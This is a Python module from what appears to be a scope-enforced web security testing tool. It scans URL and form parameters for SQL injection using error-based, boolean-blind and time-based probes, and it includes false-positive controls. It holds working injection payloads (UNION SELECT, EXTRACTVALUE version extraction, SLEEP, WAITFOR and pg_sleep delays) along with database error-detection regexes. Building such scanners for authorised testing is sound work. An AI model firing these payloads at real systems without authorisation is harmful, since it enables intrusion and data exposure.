"""
SQL Injection Scanner — error-based, boolean blind, time-based, union

FALSE-POSITIVE ELIMINATION STRATEGY
====================================
PROBLEM 1 – Error-based FPs: Generic strings like "error", "syntax" or "warning"
 appear in countless normal web pages (analytics, form validation, etc.)
 Fix: Match COMPLETE database error message patterns with regex.

PROBLEM 2 – Boolean blind FPs: Comparing response lengths for id=1 AND 1=1
 vs id=1 AND 1=2 is unreliable — many sites return different content for
 these naturally (the page might include the parameter value in the output).
 Fix: Must show consistent differential across THREE independent true/false pairs.

PROBLEM 3 – Time-based FPs: A slow server will always look like a timing attack.
 Fix: 5-sample baseline with standard deviation, require delay > baseline + 4*stddev,
 minimum absolute threshold of 4 seconds above baseline.
"""
from __future__ import annotations
import asyncio
import re
import statistics
import time
import urllib.parse
from typing import Any

from talisman.engine.scope import ScopeViolationError

from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

# ---------------------------------------------------------------------------
# Strict error patterns — full regex, not substring match
# ---------------------------------------------------------------------------
ERROR_SIGNATURES: list[tuple[re.Pattern, str]] = [
 # MySQL / MariaDB
 (re.compile(r"You have an error in your SQL syntax.*?MySQL server version", re.IGNORECASE | re.DOTALL), "MySQL"),
 (re.compile(r"Warning:\s+mysqli?_\w+\(\)", re.IGNORECASE), "MySQL"),
 (re.compile(r"MySQLSyntaxErrorException", re.IGNORECASE), "MySQL"),
 (re.compile(r"valid MySQL result", re.IGNORECASE), "MySQL"),
 (re.compile(r"check the manual that (?:corresponds to|corresponds) your (?:MySQL|MariaDB) server version", re.IGNORECASE), "MySQL/MariaDB"),
 (re.compile(r"Incorrect syntax near '[^']+' at line \d+", re.IGNORECASE), "MySQL"),
 # Oracle
 (re.compile(r"ORA-\d{4,5}:", re.IGNORECASE), "Oracle"),
 (re.compile(r"Oracle error", re.IGNORECASE), "Oracle"),
 (re.compile(r"Warning:\s+oci_\w+\(\)", re.IGNORECASE), "Oracle"),
 (re.compile(r"PL/SQL:.*?ORA-\d+", re.IGNORECASE | re.DOTALL), "Oracle"),
 # Microsoft SQL Server
 (re.compile(r"Microsoft OLE DB Provider for SQL Server.*?error", re.IGNORECASE | re.DOTALL), "MSSQL"),
 (re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE), "MSSQL"),
 (re.compile(r"ODBC SQL Server Driver", re.IGNORECASE), "MSSQL"),
 (re.compile(r"\[SQL Server\]\[ODBC SQL Server Driver\]", re.IGNORECASE), "MSSQL"),
 (re.compile(r"Microsoft SQL Native Client error '\d+", re.IGNORECASE), "MSSQL"),
 (re.compile(r"SQLServerException:\s+\w", re.IGNORECASE), "MSSQL"),
 (re.compile(r"Conversion failed when converting the \w+ value", re.IGNORECASE), "MSSQL"),
 # PostgreSQL
 (re.compile(r"PostgreSQL.*?ERROR.*?at character \d+", re.IGNORECASE | re.DOTALL), "PostgreSQL"),
 (re.compile(r"Warning:\s+pg_\w+\(\)", re.IGNORECASE), "PostgreSQL"),
 (re.compile(r"Npgsql\.", re.IGNORECASE), "PostgreSQL"),
 (re.compile(r'PG::SyntaxError:\s+ERROR:', re.IGNORECASE), "PostgreSQL"),
 (re.compile(r"ERROR:\s+syntax error at or near", re.IGNORECASE), "PostgreSQL"),
 # SQLite
 (re.compile(r"SQLite/JDBCDriver", re.IGNORECASE), "SQLite"),
 (re.compile(r"SQLite\.Exception.*?:\s*", re.IGNORECASE), "SQLite"),
 (re.compile(r"System\.Data\.SQLite\.SQLiteException", re.IGNORECASE), "SQLite"),
 (re.compile(r"SQLITE_ERROR\s+SQL logic error", re.IGNORECASE), "SQLite"),
 # DB2
 (re.compile(r"DB2 SQL error:\s+SQLCODE=", re.IGNORECASE), "DB2"),
 (re.compile(r"com\.ibm\.db2\.jcc\.am\.SqlException", re.IGNORECASE), "DB2"),
 # Sybase
 (re.compile(r"Sybase message:\s+\w", re.IGNORECASE), "Sybase"),
 (re.compile(r"com\.sybase\.jdbc\w+\.SybSQLException", re.IGNORECASE), "Sybase"),
]

# ---------------------------------------------------------------------------
# True/False payload pairs for boolean blind
# ---------------------------------------------------------------------------
BOOLEAN_PAIRS: list[tuple[str, str, str]] = [
 # (true_payload, false_payload, dbms_hint)
 ("' AND '1'='1", "' AND '1'='2", "generic"),
 ("1 AND 1=1", "1 AND 1=2", "generic"),
 ("1' AND 1=1--", "1' AND 1=2--", "mysql/mssql"),
 ("1 AND 1=1--", "1 AND 1=2--", "mysql/mssql"),
 ("1) AND (1=1", "1) AND (1=2", "generic"),
 ("1' AND 'a'='a'--", "1' AND 'a'='b'--", "mysql/mssql"),
 ("1 OR 1=1--", "1 OR 1=2 AND 1=1--", "mysql/mssql"),
]

# Time-based payloads
TIME_PAYLOADS: list[tuple[str, str]] = [
 # (payload, dbms)
 ("1' AND SLEEP(6)--", "MySQL"),
 ("1 AND SLEEP(6)--", "MySQL"),
 ("1'; WAITFOR DELAY '0:0:6'--", "MSSQL"),
 ("1 WAITFOR DELAY '0:0:6'--", "MSSQL"),
 ("1' AND (SELECT * FROM (SELECT(SLEEP(6)))a)--", "MySQL"),
 ("'; SELECT pg_sleep(6)--", "PostgreSQL"),
 ("1; SELECT pg_sleep(6)--", "PostgreSQL"),
]

SLEEP_DURATION = 6
# Minimum absolute delay above baseline
MIN_DELAY_ABOVE_BASELINE = 4.0


def _detect_sqli_error(html: str) -> tuple[bool, str]:
 """Return (True, dbms) if html contains a confirmed SQL error."""
 for pattern, dbms in ERROR_SIGNATURES:
  if pattern.search(html):
   return True, dbms
 return False, ""


async def _get_baseline_stats(
 url: str,
 param: str,
 method: str,
 client: TalismanHTTPClient,
 samples: int = 5,
) -> tuple[float, float, int, int]:
 """
 Returns (median_time, stddev_time, median_status, median_length).
 """
 parsed = urllib.parse.urlparse(url)
 base_params = dict(urllib.parse.parse_qsl(parsed.query))

 times: list[float] = []
 statuses: list[int] = []
 lengths: list[int] = []

 for i in range(samples):
  test_params = {**base_params, param: f"{i + 100}"}
  try:
   start = time.monotonic()
   if method == "GET":
    test_url = parsed._replace(
     query=urllib.parse.urlencode(test_params)
    ).geturl()
    r = await client.get(test_url, timeout=10)
   else:
    r = await client.post(url, data={param: f"{i + 100}"}, timeout=10)
   times.append(time.monotonic() - start)
   statuses.append(r.status_code)
   lengths.append(len(r.text))
  except Exception:
   times.append(1.0)
   statuses.append(200)
   lengths.append(0)

 median_time = statistics.median(times)
 stddev = statistics.stdev(times) if len(times) > 1 else 0.5
 median_status = sorted(statuses)[len(statuses) // 2]
 median_length = sorted(lengths)[len(lengths) // 2]

 return median_time, stddev, median_status, median_length


async def _test_error_based(
 url: str,
 param: str,
 method: str,
 client: TalismanHTTPClient,
) -> dict[str, Any] | None:
 parsed = urllib.parse.urlparse(url)
 base_params = dict(urllib.parse.parse_qsl(parsed.query))

 error_payloads = [
  "'",
  "''",
  "';",
  '"',
  "`",
  "1'",
  "1\"",
  "1`",
  "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
  "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  "1 UNION SELECT NULL,NULL,NULL--",
  "1' UNION SELECT NULL,NULL,NULL--",
  "1; SELECT @@version--",
 ]

 for payload in error_payloads:
  test_params = {**base_params, param: payload}
  try:
   if method == "GET":
    test_url = parsed._replace(
     query=urllib.parse.urlencode(test_params)
    ).geturl()
    r = await client.get(test_url, timeout=10)
   else:
    r = await client.post(url, data={param: payload}, timeout=10)

   found, dbms = _detect_sqli_error(r.text)
   if found:
    # Extract the error snippet for evidence
    for pattern, _ in ERROR_SIGNATURES:
     m = pattern.search(r.text)
     if m:
      snippet = r.text[max(0, m.start() - 10): m.end() + 100].strip()
      return {
       "technique": "error_based",
       "dbms": dbms,
       "payload": payload,
       "evidence": snippet[:300],
       "request": (
        f"{method} {url}?"
        f"{param}={urllib.parse.quote(payload)} HTTP/1.1"
       ),
      }
  except Exception as e:
   log.debug("sqli_error_test", param=param, error=str(e)[:60])

 return None


async def _test_boolean_blind(
 url: str,
 param: str,
 method: str,
 client: TalismanHTTPClient,
 baseline_length: int,
 baseline_status: int,
) -> dict[str, Any] | None:
 """
 Require ALL THREE of:
  a) true-payload response length ≈ baseline (within 15%)
  b) false-payload response length differs from true-payload by >100 chars
  c) This pattern holds consistently across 3 different true/false pairs
 """
 parsed = urllib.parse.urlparse(url)
 base_params = dict(urllib.parse.parse_qsl(parsed.query))

 confirmed_pairs: list[dict[str, Any]] = []

 for true_p, false_p, hint in BOOLEAN_PAIRS:
  try:
   tp = {**base_params, param: true_p}
   fp = {**base_params, param: false_p}

   if method == "GET":
    r_true = await client.get(
     parsed._replace(query=urllib.parse.urlencode(tp)).geturl(),
     timeout=10,
    )
    r_false = await client.get(
     parsed._replace(query=urllib.parse.urlencode(fp)).geturl(),
     timeout=10,
    )
   else:
    r_true = await client.post(url, data={param: true_p}, timeout=10)
    r_false = await client.post(url, data={param: false_p}, timeout=10)

   true_len = len(r_true.text)
   false_len = len(r_false.text)
   len_diff = abs(true_len - false_len)
   status_diff = r_true.status_code != r_false.status_code
   true_status_matches_baseline = r_true.status_code == baseline_status

   # True controls must match both the baseline status and approximate body
   # length; this filters login redirects, WAF pages and generic errors.
   baseline_match = (
    true_status_matches_baseline
    and baseline_length > 0
    and abs(true_len - baseline_length) / max(baseline_length, 1) < 0.10
   )

   # A false control must differ materially after the true control matches
   # baseline. Status-only differences are not sufficient evidence.
   if len_diff > 150 and baseline_match:
    confirmed_pairs.append({
     "true_payload": true_p,
     "false_payload": false_p,
     "true_len": true_len,
     "false_len": false_len,
     "diff": len_diff,
     "hint": hint,
    })

   # Require three independent true/false pairs before raising a candidate.
   if len(confirmed_pairs) >= 3:
    best = max(confirmed_pairs, key=lambda x: x["diff"])
    return {
     "technique": "boolean_blind",
     "dbms": "unknown",
     "true_payload": best["true_payload"],
     "false_payload": best["false_payload"],
     "diff_bytes": best["diff"],
     "confirmed_pairs": len(confirmed_pairs),
     "evidence": (
      f"True payload ({best['true_payload']}) returned "
      f"{best['true_len']} bytes; "
      f"False payload ({best['false_payload']}) returned "
      f"{best['false_len']} bytes. "
      f"Response differential observed across {len(confirmed_pairs)} pairs; "
      "manual query-execution verification is still required."
     ),
     "request": (
      f"{method} {url}?"
      f"{param}={urllib.parse.quote(best['true_payload'])} HTTP/1.1"
     ),
    }
  except Exception as e:
   log.debug("sqli_boolean_test", param=param, error=str(e)[:60])

 return None


async def _test_time_based(
 url: str,
 param: str,
 method: str,
 baseline_time: float,
 baseline_stddev: float,
 client: TalismanHTTPClient,
) -> dict[str, Any] | None:
 parsed = urllib.parse.urlparse(url)
 base_params = dict(urllib.parse.parse_qsl(parsed.query))

 # Dynamic threshold: baseline + max(4s, 4 * stddev)
 threshold = baseline_time + max(MIN_DELAY_ABOVE_BASELINE, 4 * baseline_stddev)

 for payload, dbms in TIME_PAYLOADS:
  test_params = {**base_params, param: payload}
  try:
   start = time.monotonic()
   if method == "GET":
    test_url = parsed._replace(
     query=urllib.parse.urlencode(test_params)
    ).geturl()
    await client.get(test_url, timeout=SLEEP_DURATION + 8)
   else:
    await client.post(
     url, data={param: payload}, timeout=SLEEP_DURATION + 8
    )
   elapsed = time.monotonic() - start

   if elapsed >= threshold:
    # Confirm with a second probe to eliminate server hiccup
    start2 = time.monotonic()
    if method == "GET":
     await client.get(test_url, timeout=SLEEP_DURATION + 8)
    else:
     await client.post(url, data={param: payload}, timeout=SLEEP_DURATION + 8)
    elapsed2 = time.monotonic() - start2

    # Both probes must be slow
    if elapsed2 >= threshold:
     return {
      "technique": "time_based",
      "dbms": dbms,
      "payload": payload,
      "elapsed": round(elapsed, 2),
      "elapsed2": round(elapsed2, 2),
      "baseline": round(baseline_time, 2),
      "threshold": round(threshold, 2),
      "evidence": (
       f"Two consecutive requests delayed: "
       f"{elapsed:.1f}s and {elapsed2:.1f}s "
       f"(baseline: {baseline_time:.1f}s, "
       f"threshold: {threshold:.1f}s)"
      ),
      "request": (
       f"{method} {url}?"
       f"{param}={urllib.parse.quote(payload)} HTTP/1.1"
      ),
     }
  except asyncio.TimeoutError:
   # Timeout = very strong indicator; confirm with second request
   try:
    start2 = time.monotonic()
    if method == "GET":
     test_url = parsed._replace(
      query=urllib.parse.urlencode(test_params)
     ).geturl()
     await client.get(test_url, timeout=SLEEP_DURATION + 8)
    else:
     await client.post(url, data={param: payload}, timeout=SLEEP_DURATION + 8)
    elapsed2 = time.monotonic() - start2
    if elapsed2 >= threshold:
     return {
      "technique": "time_based",
      "dbms": dbms,
      "payload": payload,
      "elapsed": f">{SLEEP_DURATION + 8}",
      "elapsed2": round(elapsed2, 2),
      "baseline": round(baseline_time, 2),
      "evidence": (
       f"Request timed out ({SLEEP_DURATION + 8}s), "
       f"confirmed with second probe ({elapsed2:.1f}s)"
      ),
      "request": (
       f"{method} {url}?"
       f"{param}={urllib.parse.quote(payload)} HTTP/1.1"
      ),
     }
   except Exception:
    pass
  except Exception as e:
   log.debug("sqli_time_test", param=param, error=str(e)[:60])

 return None


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 techniques: list[str] | None = None,
 oast_domain: str | None = None,
 waf_bypass: bool = False,
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 if scope is None:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "error": "scope_enforcer_required",
  }
 try:
  scope.assert_in_scope(url)
 except ScopeViolationError as exc:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "error": str(exc),
  }

 console.print(
  f"\n[module][+] SQL Injection Candidate Scanner[/module] -> [target]{url}[/target]"
 )
 active_techniques = set(techniques or ["error", "boolean"])
 supported_techniques = {"error", "boolean", "time"}
 if not active_techniques or active_techniques - supported_techniques:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "error": "techniques must be selected from error, boolean and time",
  }

 skipped_techniques: list[str] = []
 if "time" in active_techniques:
  try:
   # Time-delay payloads deliberately add server-side latency and must be
   # explicitly authorized as destructive testing.
   scope.assert_destructive_allowed(url, "POST")
  except ScopeViolationError:
   active_techniques.remove("time")
   skipped_techniques.append("time")

 if not active_techniques:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "skipped": True,
   "skipped_techniques": skipped_techniques,
   "reason": (
    "Time-based SQLi probes require allow_state_changing_requests=true, "
    "avoid_writes=false and avoid_destructive=false in the scope policy."
   ),
  }

 candidates: list[dict[str, Any]] = []
 parsed = urllib.parse.urlparse(url)
 params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
 if not params:
  params = [
   "id", "user_id", "product_id", "order_id",
   "page", "cat", "category", "search", "q", "item",
  ]

 async with TalismanHTTPClient(
  proxy=proxy,
  timeout=18,
  scope=scope,
 ) as client:
  seen_params: set[str] = set()
  for param in params:
   if param in seen_params:
    continue

   for method in ["GET", "POST"]:
    result = None
    if "error" in active_techniques:
     result = await _test_error_based(url, param, method, client)

    if not result and "boolean" in active_techniques:
     try:
      _, _, baseline_status, baseline_length = await _get_baseline_stats(
       url,
       param,
       method,
       client,
       samples=5,
      )
      result = await _test_boolean_blind(
       url,
       param,
       method,
       client,
       baseline_length,
       baseline_status,
      )
     except Exception as exc:
      log.debug("sqli_boolean_setup", error=type(exc).__name__)

    if not result and "time" in active_techniques:
     try:
      baseline_time, baseline_stddev, _, _ = await _get_baseline_stats(
       url,
       param,
       method,
       client,
       samples=7,
      )
      result = await _test_time_based(
       url,
       param,
       method,
       baseline_time,
       baseline_stddev,
       client,
      )
     except Exception as exc:
      log.debug("sqli_time_setup", error=type(exc).__name__)

    if result:
     seen_params.add(param)
     result["param"] = param
     result["url"] = url
     result["method"] = method
     result["confidence"] = "candidate"
     result["requires_manual_verification"] = True
     result["verification_required"] = (
      "Reproduce with a controlled true/false pair or a DBMS-specific "
      "error/query oracle, repeat against a stable baseline, and show that "
      "the result is caused by SQL evaluation rather than application errors, "
      "WAF behavior, caching or response-size noise."
     )
     candidates.append(result)
     break

 console.print(
  f" Found {len(candidates)} SQLi candidates requiring query-execution verification"
 )
 return {
  "target": url,
  "findings": [],
  "candidates": candidates,
  "count": 0,
  "candidate_count": len(candidates),
  "skipped_techniques": skipped_techniques,
 }
